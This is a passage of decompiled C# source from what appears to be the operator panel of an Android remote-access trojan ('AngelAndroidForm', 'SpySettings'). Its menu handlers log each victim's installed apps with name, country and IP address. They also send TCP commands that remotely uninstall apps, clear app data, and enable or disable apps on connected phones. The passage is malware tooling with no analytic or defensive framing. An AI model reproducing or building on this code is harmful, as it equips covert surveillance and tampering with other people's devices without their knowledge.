			}
		}
	}

	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
			{
				reso.SAVEit((Array)a0);
			}, new object[8]
			{
				DGV0,
				"null",
				saveFileDialog.FileName,
				tmpClientName,
				tmpCountry + " - " + tmpAddressIP,
				"Applications",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(classClient);
		ThreadPool.QueueUserWorkItem([SpecialName] [DebuggerHidden] (object a0) =>
		{
			reso.SAVEit((Array)a0);
		}, new object[8]
		{
			DGV0,
			tmpFolderUSER,
			"Applications",
			tmpClientName,
			tmpCountry + " - " + tmpAddressIP,
			"Applications",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (BoxTitlePaintEventArgsWait)
			{
				int count = DGV0.Rows.Count;
				string text = "All " + Conversions.ToString(count);
				string text2 = "Selected " + Conversions.ToString(DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, defaultColor_Foreground.R, defaultColor_Foreground.G, defaultColor_Foreground.B)), 0, 1, BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(text + Strings.Space(10) + text2, reso.f);
				Rectangle rect = new Rectangle(0, 2, BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(text + Strings.Space(10) + text2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (BoxTitle.Height != size2.Height + 3)
				{
					BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "load" + Data.SPL_DATA + "y",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value);
				if (classClient != null)
				{
					TcpClient myClient = classClient.myClient;
					string[] array = classClient.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "SFD<*>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private void ClearAppDataToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value);
				if (classClient != null)
				{
					TcpClient myClient = classClient.myClient;
					string[] array = classClient.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "CRD<*>E>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		checked
		{
			int num = DGV0.SelectedRows.Count - 1;
			for (int i = num; i >= 0; i += -1)
			{
				string text = Conversions.ToString(DGV0.Rows[DGV0.SelectedRows[i].Index].Cells[2].Value);
				if (classClient != null)
				{
					TcpClient myClient = classClient.myClient;
					string[] array = classClient.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "CRD<*>D>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
	}

	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		BoxTitle.Invalidate();
	}

	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		BoxTitle.Invalidate();
	}
}
